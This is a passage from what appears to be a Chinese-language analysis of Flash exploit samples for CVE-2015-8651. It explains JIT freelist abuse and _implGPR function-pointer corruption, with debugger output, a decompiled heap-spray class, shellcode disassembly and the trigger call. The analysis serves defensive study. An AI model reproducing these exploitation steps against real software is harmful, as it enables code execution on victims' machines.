图65 周期性调用的doInitDelay方法
当上述方法被调用时，原先使用的某块内存会被置成保留状态，对新分配的内存程序会调用VirtualProtect函数将其页面属性设为RX。在此情况下，伪造的freelists元素所指向的内存区域最终会被用到。
    0:006> !address 16dc3000
    Usage: 
    Base Address: 16dc3000
    End Address: 17050000
    Region Size: 00010000 ( 64.000 kB)
    State: 00001000 MEM_COMMIT
    Protect: 00000020 PAGE_EXECUTE_READ
    Type: 00020000 MEM_PRIVATE
    Allocation Base: 16cf9000
    Allocation Protect: 00000001 PAGE_NOACCESS
    Content source: 1 (target), length: 1000
图66 目标内存的页属性变成了可读可执行
因此，攻击者采用的策略就是利用ByteArray对象的分配函数来获取特定大小的堆空间，并将其链接到freelists结构中，以便相应的堆内存能在周期性事件处理所调用的JIT生成器中被用到。通过这种方式，exploit还能将目标内存的页面属性从可读写转变成可读可执行。同时，由于在新的JIT空间初始化时，目标内存上的数据并没有被初始化，所以在这种情况下，包含有shellcode的ByteArray对象内容不会从JIT空间中消失，后面这些shellcode将被用于代码的执行。
此漏洞目前已经修复了，在JIT生成器重新使用freelists中的内存块前，那些现有内存中的数据都将被初始化，这有效清除了伪造的freelists结构中写入的shellcode，从而彻底杜绝这种攻击方式。
#### 5.2 MethodInfo._implGPR函数指针corruption
而在坊间发现的CVE-2015-8651利用样本中则采用了MethodInfo._implGPR函数指针corruption的方法来实现利用，相关定义如下。
    /**
    * Base class for MethodInfo which contains invocation pointers. These
    * pointers are private to the ExecMgr instance and hence declared here.
    */
    class GC_CPP_EXACT(MethodInfoProcHolder, MMgc::GCTraceableObject)
    {
      ...
     private:
      union {
        GprMethodProc _implGPR; core();
      const int32_t bt = ms->returnTraitsBT();
      switch(bt){
      ...
      default:
      {
        STACKADJUST(); // align stack for 32-bit Windows and MSVC compiler
        const Atom i = (*env->method->_implGPR)(env, argc, ap);
        STACKRESTORE();
        ...
图68 _implGPR函数会在JIT函数返回时被调用
为了实现_implGPR函数指针的corruption，此样本首先借助CustomByteArray对象进行堆喷，此对象的声明如下。
    public class CustomByteArray extends ByteArray
    {
      private static const _SafeStr_35:_SafeStr_10 = _SafeStr_10._SafeStr_36();
      public var _SafeStr_625:uint = 0xFFEEDD00;
      public var _SafeStr_648:uint = 4293844225;
      public var _SafeStr_629:uint = 0xF0000000;
      public var _SafeStr_631:uint = 0xFFFFFFFF;
      public var _SafeStr_633:uint = 0xFFFFFFFF;
      public var _SafeStr_635:uint = 0;
      public var _SafeStr_628:uint = 0xAAAAAAAA;
      public var _SafeStr_630:uint = 0xAAAAAAAA;
      public var _SafeStr_632:uint = 0xAAAAAAAA;
      public var _SafeStr_634:uint = 0xAAAAAAAA;
      public var _SafeStr_649:uint = 4293844234;
      public var _SafeStr_650:uint = 4293844235;
      public var _SafeStr_651:uint = 4293844236;
      public var _SafeStr_652:uint = 4293844237;
      public var _SafeStr_653:uint = 4293844238;
      public var _SafeStr_626:uint = 4293844239;
      public var _SafeStr_654:uint = 4293844240;
      public var _SafeStr_655:uint = 4293844241;
      public var _SafeStr_656:uint = 4293844242;
      public var _SafeStr_657:uint = 4293844243;
      public var _SafeStr_658:uint = 4293844244;
      public var _SafeStr_659:uint = 4293844245;
      public var _SafeStr_660:uint = 4293844246;
      public var _SafeStr_661:uint = 4293844247;
      public var _SafeStr_662:uint = 4293844248;
      public var _SafeStr_663:uint = 4293844249;
      public var _SafeStr_664:uint = 4293844250;
      public var _SafeStr_665:uint = 4293844251;
      public var _SafeStr_666:uint = 4293844252;
      public var _SafeStr_667:uint = 4293844253;
      public var _SafeStr_668:uint = 4293844254;
      public var _SafeStr_669:uint = 4293844255;
      public var _SafeStr_164:Object;  dd 0f4a0020  01fb0000 (Shellcode) 
MethodClosure(0x16e7f370) -> MethodEnv(0x068cdcb8) -> MethodInfo (0x1e0b6270)
-> MethodInfo._implGPR(0x1e0b6274)。
MethodInfo._implGPR函数指针(0x1e0b6274处)最初指向的地址是0x0b8cdcb0，相应的反汇编结果如下：
    0b8cdcb0 55           push ebp
    0b8cdcb1 8bec         mov ebp,esp
    0b8cdcb3 90           nop
    0b8cdcb4 83ec18       sub esp,18h
    0b8cdcb7 8b4d08       mov ecx,dword ptr [ebp+8]
    0b8cdcba 8d45f0       lea eax,[ebp-10h]
    0b8cdcbd 8b1550805107 mov edx,dword ptr ds:[7518050h]
    0b8cdcc3 894df4       mov dword ptr [ebp-0Ch],ecx
    0b8cdcc6 8955f0       mov dword ptr [ebp-10h],edx
    0b8cdcc9 890550805107 mov dword ptr ds:[7518050h],eax
    0b8cdccf 8b1540805107 mov edx,dword ptr ds:[7518040h]
    0b8cdcd5 3bc2         cmp eax,edx
    0b8cdcd7 7305         jae 0b8cdcde
    0b8cdcd9 e8c231604d   call Flash!IAEModule_IAEKernel_UnloadModule+0x1fd760 (58ed0ea0)
    0b8cdcde 33c0         xor eax,eax
    0b8cdce0 8b4df0       mov ecx,dword ptr [ebp-10h]
    0b8cdce3 890d50805107 mov dword ptr ds:[7518050h],ecx
    0b8cdce9 8be5         mov esp,ebp
    0b8cdceb 5d           pop ebp
    0b8cdcec c3           ret
图73 _impGPR函数指针最初指向的内容
而修改后的MethodInfo._impGPR函数指针将会指向shellcode代码，其反汇编结果如下：
    01fb0000 60         pushad
    01fb0001 e802000000 call 01fb0008
    01fb0006 61         popad
    01fb0007 c3         ret
    01fb0008 e900000000 jmp 01fb000d
    01fb000d 56         push esi
    01fb000e 57         push edi
    01fb000f e83b000000 call 01fb004f
    01fb0014 8bf0       mov esi,eax
    01fb0016 8bce       mov ecx,esi
    01fb0018 e86f010000 call 01fb018c
    01fb001d e88f080000 call 01fb08b1
    01fb0022 33c9       xor ecx,ecx
    01fb0024 51         push ecx
    01fb0025 51         push ecx
    01fb0026 56         push esi
    01fb0027 05cb094000 add eax,4009CBh
    01fb002c 50         push eax
    01fb002d 51         push ecx
    01fb002e 51         push ecx
    01fb002f ff560c     call dword ptr [esi+0Ch]
    01fb0032 8bf8       mov edi,eax
    01fb0034 6aff       push 0FFFFFFFFh
    01fb0036 57         push edi
    01fb0037 ff5610     call dword ptr [esi+10h]
    01fb003a 57         push edi
    01fb003b ff5614     call dword ptr [esi+14h]
    01fb003e 5f         pop edi
    01fb003f 33c0       xor eax,eax
    01fb0041 5e         pop esi
    01fb0042 c3         ret
图74 shellcode代码
在完成MethodInfo._impGPR函数指针的corruption后，就可以调用_SafeStr_340上的call.apply或call.call方法闭包来触发shellcode的执行。
    private function _SafeStr_355(_arg_1:*)
    {
      return (_SafeStr_340.call.apply(null, _arg_1));
    }